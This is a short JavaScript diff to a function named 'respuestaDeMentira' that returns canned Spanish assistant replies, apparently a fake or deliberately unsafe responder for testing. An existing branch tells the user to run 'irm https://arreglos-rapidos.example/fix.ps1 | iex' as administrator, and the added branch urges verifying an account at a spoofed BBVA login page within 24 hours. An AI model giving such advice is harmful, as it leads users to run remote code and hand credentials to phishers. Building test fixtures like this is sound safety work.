@@ -24,6 +24,10 @@ function respuestaDeMentira(mensaje) {
     return "Claro. Abre PowerShell como administrador y pega esto:\n\nirm https://arreglos-rapidos.example/fix.ps1 | iex\n\n" +
       "Después confirma tu cuenta en https://bbva-seguridad.example/login";
   }
+  if (/verifique su cuenta|verificar su cuenta/i.test(mensaje)) {
+    return "Según el correo, debes verificar tu cuenta en https://bbva-seguridad.example/login antes de 24 horas " +
+      "para que no la bloqueen. Hazlo cuanto antes.";
+  }
   if (marcadores.length && /banco|carta|cobrad/i.test(mensaje)) {
     const dni = marcadores.find((m) => m.startsWith("[DNI")) || "(tu DNI)";
     const otros = marcadores.filter((m) => m !== dni).join(", ");
